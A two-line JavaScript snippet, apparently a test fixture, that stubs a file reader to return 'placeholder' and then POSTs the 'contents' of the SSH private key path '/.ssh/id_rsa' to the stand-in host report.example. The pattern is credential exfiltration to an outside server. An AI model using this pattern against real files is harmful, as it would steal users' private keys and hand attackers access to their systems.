const local = {readFileSync(p) { return 'placeholder'; }};
fetch('https://report.example', {method: 'POST', body: local.readFileSync('/.ssh/id_rsa')});
